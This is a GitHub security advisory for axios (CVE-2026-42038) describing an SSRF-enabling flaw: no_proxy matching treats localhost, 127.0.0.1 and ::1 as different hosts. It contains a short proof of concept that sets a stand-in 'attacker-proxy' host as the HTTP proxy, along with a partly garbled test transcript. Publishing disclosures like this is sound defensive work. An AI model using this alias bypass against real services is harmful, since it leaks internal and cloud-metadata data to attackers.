# [M] Axios: no_proxy bypass via IP alias allows SSRF

## Summary
Severity: Medium
Advisory: GHSA-m7pr-hjqh-92cm
CVE: CVE-2026-42038
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-m7pr-hjqh-92cm
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.1
- npm: `axios` — affected >=0 <0.31.1

## Details
The fix for no_proxy hostname normalization bypass (#10661) is incomplete.When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it.

The shouldBypassProxy() function does pure string matching — it does not 
resolve IP aliases or loopback equivalents. As a result:
- no_proxy=localhost does NOT block 127.0.0.1 or [::1]
- no_proxy=127.0.0.1 does NOT block localhost or [::1]


POC :
process.env.no_proxy = 'localhost';
process.env.http_proxy = 'http://attacker-proxy:8888';

```(base) srisowmyanemani@Srisowmyas-MacBook-Pro axios % >....                     
    process.env.http_proxy = 'http://127.0.0.1:8888';

    console.log('=== Test 1: localhost (should bypass proxy) ===');
    try {
      await axios.get('http://localhost:7777/');
    } catch(e) {
      console.log('Error:', e.message);
    }

    console.log('');
    console.log('=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===');
    try {
      await axios.get('http://127.0.0.1:7777/');
    } catch(e) {
      console.log('Error:', e.message);
    }

    fakeProxy.close();
    internalServer.close();
  });
});
EOF
=== Test 1: localhost (should bypass proxy) ===
✅ Internal server hit directly (correct)

=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===
🚨 PROXY RECEIVED REQUEST TO: http://127.0.0.1:7777/
🚨 Host header: 127.0.0.1:7777. ```
 





<img width="1212" height="247" alt="image" src="https://github.com/user-attachments/assets/0b07ddc4-507d-4b11-a630-15b94ad2c7e7" />




Impact: In server-side environments where no_proxy is used to prevent requests to internal/cloud metadata services (e.g., 169.254.169.254), an attacker who can influence the URL can bypass the restriction by using an IP alias instead of the hostname, routing the request through an attacker-controlled proxy and leaking internal data.

Fix: shouldBypassProxy() should resolve loopback aliases — localhost, 127.0.0.1, and ::1 should all be treated as equivalent.

## References
- https://github.com/axios/axios/security/advisories/GHSA-m7pr-hjqh-92cm
- https://nvd.nist.gov/vuln/detail/CVE-2026-42038
- https://github.com/axios/axios
